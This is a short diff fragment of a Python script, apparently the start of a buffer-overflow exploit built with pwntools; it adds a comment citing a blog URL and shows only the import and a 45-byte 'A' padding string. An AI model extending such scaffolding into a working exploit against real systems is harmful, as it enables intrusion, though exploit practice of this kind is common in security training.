@@ -1,3 +1,4 @@
+# http://nextline.tistory.com/101
 from pwn import *
 
 padding = "A" * 45
